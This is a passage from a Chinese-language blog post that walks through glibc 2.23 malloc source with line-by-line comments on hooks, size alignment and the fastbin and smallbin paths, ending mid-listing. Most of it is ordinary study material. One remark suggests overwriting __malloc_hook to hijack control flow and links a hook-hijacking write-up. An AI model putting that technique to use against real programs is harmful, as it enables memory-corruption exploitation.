<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;<span class="comment">//堆块指针</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));<span class="comment">//在实际调用int_malloc函数之前,首先调用钩子函数hook,hook指向__malloc_hook</span></span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);<span class="comment">//获取分配区指针,返回值交给ar_ptr,传递参数bytes的作用是判断分配区空间是否足够</span></span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);<span class="comment">//int_malloc函数是实际进行内存分配的函数</span></span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)<span class="comment">//分配失败并且没有获取到分配区</span></span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);<span class="comment">//分配区获取失败,重试一次</span></span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);<span class="comment">//重新获取分配区之后再次尝试切割堆块给victim</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)<span class="comment">//解锁,因为int_malloc中会对分配区上锁,解锁后方便其他线程分配内存</span></span><br><span class="line">    (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));<span class="comment">//最后一次检查</span></span><br><span class="line">    <span class="comment">//检查内容包括:</span></span><br><span class="line">        <span class="comment">//victim指针是否真的指向一个堆块</span></span><br><span class="line">        <span class="comment">//victim对应的堆块是否已经在bitmap中被标记</span></span><br><span class="line">        <span class="comment">//ar_ptr指向的分配区,是否是victim堆块所在的分配区</span></span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="atomic_forced_read">atomic_forced_read</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> atomic_forced_read(x) \</span></span><br><span class="line"><span class="meta">  (&#123; __typeof (x) __x; __asm (<span class="string">&quot;&quot;</span> : <span class="string">&quot;=r&quot;</span> (__x) : <span class="string">&quot;0&quot;</span> (x)); __x; &#125;)</span></span><br></pre></td></tr></table></figure>
<p>原子读,这段内联汇编应该这样断句:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__asm (</span><br><span class="line"> 	&quot;&quot; </span><br><span class="line"> 	: &quot;=r&quot; (__x) </span><br><span class="line"> 	: &quot;0&quot; (x)</span><br><span class="line"> ); </span><br></pre></td></tr></table></figure>
<p>首先""意思是没有一条指令,本内联代码块只需要使用输入输出约束</p>
<p><code>"=r" (__x)</code>输出操作数约束,意思是将<code>__x</code>视为输出变量,放到通用寄存器里</p>
<p><code>: "0" (x)</code>输入操作数约束,意思是x使用和第一个输出操作数(也就是<code>__x</code>)相同的约束</p>
<p>整个内联汇编的作用是将变量x拷贝到<code>__x</code>中</p>
<p>看完了也不知道"原子"如何保证的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>编译器分支预测优化</p>
<p><code>long __builtin_expect(long exp, long c);</code>期望exp表达式的值等于c</p>
<h5 id="malloc_hook">__malloc_hook</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">static void *malloc_hook_ini(size_t sz,const void *caller) __THROW;</span><br><span class="line">void *weak_variable (*__malloc_hook)(size_t __size, const void *) = malloc_hook_ini;</span><br></pre></td></tr></table></figure>
<p>分配前钩子,如果有注册钩子函数,则调用该钩子函数进行分配,直接返回钩子函数的返回值给句柄,不会再调用glibc自己实现的int_malloc</p>
<p>可以考虑篡改malloc_hook钩子劫持控制流</p>
<p><a
target="_blank" rel="noopener" href="https://seanachao.github.io/2020/07/13/hook劫持/">malloc_hook以及free_hook劫持原理
| S3cana's Blog (seanachao.github.io)</a></p>
<h4 id="int_malloc">_int_malloc</h4>
<p>这个函数很长,因为GNU向来要求函数嵌套不能太深,因此这个一个函数综合了从fastbin,smallbin,bin,unsortedbin等各种地方申请堆块的操作</p>
<p>glibc2.23/malloc/malloc.c 第3318行开始</p>
<p>函数签名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">static void *_int_malloc (mstate av, size_t bytes);</span><br></pre></td></tr></table></figure>
<p>static决定本函数只能在malloc模块中可见,用户程序无法越级调用</p>
<p>void*返回值类型</p>
<p>两个参数,<code>mstate av</code>是分配区指针</p>
<p><code>size_t bytes</code>是企图分配的内存大小</p>
<h4 id="算法流程">算法流程</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/malloc.png"
alt="malloc" />
<figcaption aria-hidden="true">malloc</figcaption>
</figure>
<h4 id="局部变量">局部变量</h4>
<p>首先定义了一众局部变量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span><span class="comment">//本变量是用户希望大小size的计算值,也就是实际的堆块大小</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* associated bin index */</span><span class="comment">//本变量用于记录nb大小的堆块属于的桶子下标</span></span><br><span class="line">mbinptr bin;                      <span class="comment">/* associated bin */</span>;<span class="comment">//桶子头指针</span></span><br><span class="line"></span><br><span class="line">mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span><span class="comment">//命中堆块</span></span><br><span class="line">INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span>	<span class="comment">//victim命中堆块本来的大小</span></span><br><span class="line"><span class="type">int</span> victim_index;                 <span class="comment">/* its bin index */</span>	<span class="comment">//victim_index命中堆块属于的桶子下标</span></span><br><span class="line"></span><br><span class="line">mchunkptr remainder;              <span class="comment">/* remainder from a split */</span>	<span class="comment">//切割一个大块,剩下的部分被称为remainder</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* its size */</span>	<span class="comment">//剩余部分的大小</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* bit map traverser */</span>	<span class="comment">//binmap下标,用于记录一个桶子属于四个block之一的哪一个</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* bit map traverser */</span>		<span class="comment">//用于记录一共桶子属于其block中的哪一位	</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span>	<span class="comment">//binmap[map],作为binmap的下标,有0,1,2,3四个取值</span></span><br><span class="line"></span><br><span class="line">mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span>		<span class="comment">//取桶子头之后一般会让bck指向之前的第一个堆块,fwd指向桶子头,然后头插</span></span><br><span class="line">mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="计算实际大小">计算实际大小</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checked_request2size (bytes, nb);</span><br></pre></td></tr></table></figure>
<p>这个宏的作用是将请求的bytes,按照对齐等规则,转化为实际上要申请的大小nb</p>
<p>经过此宏之后,int_malloc中使用的都是nb,不再使用bytes作为分配大小</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#define checked_request2size(req, sz)                             \</span><br><span class="line">  if (REQUEST_OUT_OF_RANGE (req)) &#123;					      \</span><br><span class="line">      __set_errno (ENOMEM);						      \</span><br><span class="line">      return 0;								      \</span><br><span class="line">    &#125;									      \</span><br><span class="line">  (sz) = request2size (req);</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  #define request2size(req)                                         \</span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  #define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span><br><span class="line">  #  define MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \</span><br><span class="line">                                  ? __alignof__ (long double) : 2 *SIZE_SZ)</span><br></pre></td></tr></table></figure>
<p>如果请求大小req+SIZE_SZ+对齐掩码小于最小分配大小,则按照最小分配大小来</p>
<p>否则将上述值和对齐掩码的补码按位与</p>
<p>在x64上</p>
<p>MALLOC_ALIGNMENT=2*SIZE_SZ=16</p>
<p>MALLOC_ALIGN_MASK=15</p>
<p>request2size(req) =(req+8+15 )&amp;11111110000</p>
<p>假设req=0x10,即用户希望得到一块至少有0x10个字节的堆块则</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">request2size(req) </span><br><span class="line">    =(<span class="number">16</span>+<span class="number">8</span>+<span class="number">15</span> )&amp;<span class="number">11111110000</span></span><br><span class="line">    =(<span class="number">0b10000</span>+<span class="number">0b1000</span>+<span class="number">0b1111</span>)&amp;<span class="number">111111110000</span></span><br><span class="line">    =<span class="number">0b100111</span>&amp;<span class="number">0b110000</span></span><br><span class="line">    =<span class="number">0b100000</span></span><br><span class="line">    =<span class="number">32</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="检查当前是否有可用分配区">检查当前是否有可用分配区</h4>
<p>然后检查av分配区指针是否为空,显然这里的编译器优化是期望其不空的</p>
<p>但是如果真的av为空,没有可用分配区的画,则调用sysmalloc直接解决分配问题</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>如果果真为空则调用sysmalloc函数,</p>
<p>sysmalloc被调用的情况是这样的:</p>
<p>当av分配区的topchunk大小不足以满足用户需求,调用sysmalloc扩大topchunk大小或者更换topchunk</p>
<p>比如调用sbrk系统调用扩大topchunk的大小</p>
<p>sysmalloc如果能成功分配堆块,则p指向该堆块,然后<code>alloc_perturb</code>将p指向堆块的用户空间的前bytes个字节,初始化为<code>perturb_byte^0xff</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> perturb_byte;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">alloc_perturb</span> <span class="params">(<span class="type">char</span> *p, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte ^ <span class="number">0xff</span>, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="fastbins区分配">fastbins区分配</h4>
<p>经过两个检查之后,如果控制流执行至此,说明需要分配的堆块不是很离谱,起码不用麻烦sbrk额外分配大块内存</p>
<p>那么首先尝试使用fastbins进行分配</p>
<blockquote>
<p>在该区分配的主要流程:</p>
<p>1.根据实际堆块大小nb计算应该落在哪个桶子里</p>
<p>2.从该桶子顶取出一个堆块交给用户</p>
<p>3.将该桶子中剩余的部分重新挂到桶子头上</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">  &#123;<span class="comment">//首先判断,nb这个大小,是否落在fastbins管理的堆块大小范围内</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//控制流至此说明nb大小适合fastbins分配,下面需要判断fastbins里面有没有空闲堆块</span></span><br><span class="line"></span><br><span class="line">    idx = fastbin_index (nb);<span class="comment">//根据nb大小计算落在fastbin的哪个桶里面,返回值是数组下标</span></span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">//&amp;fastbins[idx]就是对应桶的桶子头</span></span><br><span class="line">    mchunkptr pp = *fb;<span class="comment">//*解引用,也就是拿出fastbins[idx]指向的第一个堆块,pp拷贝堆块的指针</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim = pp;<span class="comment">//如果上来victim就为空,说明桶子头fastbins[idx]指向NULL,也就是这个桶是空的</span></span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> (</span><br><span class="line">    		(pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)</span><br><span class="line">          )!= victim</span><br><span class="line">        <span class="comment">//victim指向链栈顶,然后把他取下来,把原来的次顶堆块挂到fb指针上,返回值pp是victim</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>)<span class="comment">//如果victim不为0说明对应桶中确实有堆块,并且已经交给victim保管</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">          &#123;<span class="comment">//victim获取到的fastbin堆块,再检查一下发现不应该属于其原本的桶中,说明有鬼</span></span><br><span class="line">            errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">          errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        check_remalloced_chunk (av, victim, nb);<span class="comment">//重新分配的堆块检查,这里指的是从topchunk割下来然后free进入各种bins然后又被重新利用的堆块</span></span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);<span class="comment">//</span></span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="smallbins区分配">smallbins区分配</h4>
<p>bins数组中维护的是桶子头的fd,bk指针,一个smallbin头需要两个bins数组元素存放,一个记录fd,一个记录bk,</p>
<p>看图一眼顶针</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/smallbin1.png"
alt="smallbin1" />
<figcaption aria-hidden="true">smallbin1</figcaption>
</figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index (nb);<span class="comment">//计算nb所在的smallbins下标</span></span><br><span class="line">    bin = bin_at (av, idx);<span class="comment">//取smallbin[idx]桶子头节点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)<span class="comment">//last(bin)=bin-&gt;fd,如果bin的指针还是指向bin说明这个桶子是空的</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">          malloc_consolidate (av);<span class="comment">//堆块合并</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;<span class="comment">//下面要将victim从双向链表上摘下来</span></span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<span class="comment">//检查victim-&gt;bk指向的堆块,其fd指针是否是victim</span></span><br><span class="line">              &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">              &#125;</span><br><span class="line">            set_inuse_bit_at_offset (victim, nb);<span class="comment">//经过malloc_consolidate后,如果本块和物理相邻的前块都没使用,则会合并起来</span></span><br><span class="line">            <span class="comment">//把victim抠下来,然后把桶子头和victim-&gt;bk连起来</span></span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">              victim-&gt;size |= NON_MAIN_ARENA;<span class="comment">//标记非主分配区</span></span><br><span class="line">            check_malloced_chunk (av, victim, nb);</span><br><span class="line">            <span class="type">void</span> *p = chunk2mem (victim);<span class="comment">//获取data基地址指针</span></span><br><span class="line">            alloc_perturb (p, bytes);<span class="comment">//填充</span></span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="fastbin合并">fastbin合并</h4>
<p>注意有两种到达此处的可能,要么是一个<code>smallbin</code>的申请,但是没在<code>smallbin</code>中找到对应堆块,要么是一个largebin的申请</p>
<p>前者<strong>不会</strong>引起<code>fastbin</code>的合并,后者会首先合并<code>fastbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line"> &#123;</span><br><span class="line">...</span><br><span class="line">   <span class="keyword">if</span> ((victim = last(bin)) != bin) <span class="comment">// bin桶子中的最后一个,如果不是bin这个头节点自己,那么说明这个桶子里至少有一个空闲堆块</span></span><br><span class="line">   &#123;</span><br><span class="line">   ...</span><br><span class="line">       <span class="keyword">return</span> p;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">   idx = largebin_index(nb);</span><br><span class="line">   <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">     malloc_consolidate(av);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p><code>fastbin</code>合并之后的堆块,都会被放到<code>unsortedbin</code>中,其目的是给<code>unsortedbin</code>区的尝试分配增大可能性</p>
<p>看上去此时将<code>fastbin</code>进行合并,有损效率,但这是为了防止<code>fastbin</code>截留堆块导致堆空间碎片化(<code>fastbin</code>中的堆块依然保持使用状态,不会被其他临近堆块向前或者向后合并.因此需要对其进行主动合并释放)</p>
<p>并且经验表明,一个程序要么主要使用<code>smallbin</code>大小的堆块,要么主要使用<code>largebin</code>大小的堆块</p>
<p>因此对<code>fastbin</code>的合并操作不会被经常调用</p>
<p>具体的<code>fastbin</code>合并过程,在<code>malloc_consolidate</code>中</p>
<h5 id="malloc_consolidate">malloc_consolidate</h5>
<blockquote>
<p>用于<code>fastbin</code>区的合并</p>
<p>两层循环,外层循环遍历<code>fastbin</code>桶子头</p>
<p>内层循环遍历挂载一个桶子头上的堆块链表</p>
<p>对每个堆块,尝试进行向前合并和向后合并,注意只会分别执行一次</p>
<p>如果尝试向后合并时发现和<code>topchunk</code>相邻则并入<code>topchunk</code></p>
<p>如果尝试向前合并和向后合并之后,没有并入topchunk会被头插法链接到<code>unsortedbin</code>的双向链表上</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr *fb;          <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr *maxfb;       <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr p;              <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr nextp;          <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr unsorted_bin;   <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr first_unsorted; <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span> nextinuse;</span><br><span class="line">  mchunkptr bck;</span><br><span class="line">  mchunkptr fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast() != <span class="number">0</span>)<span class="comment">//如果max_faxt值为空,则说明堆还没有初始化</span></span><br><span class="line">  &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">  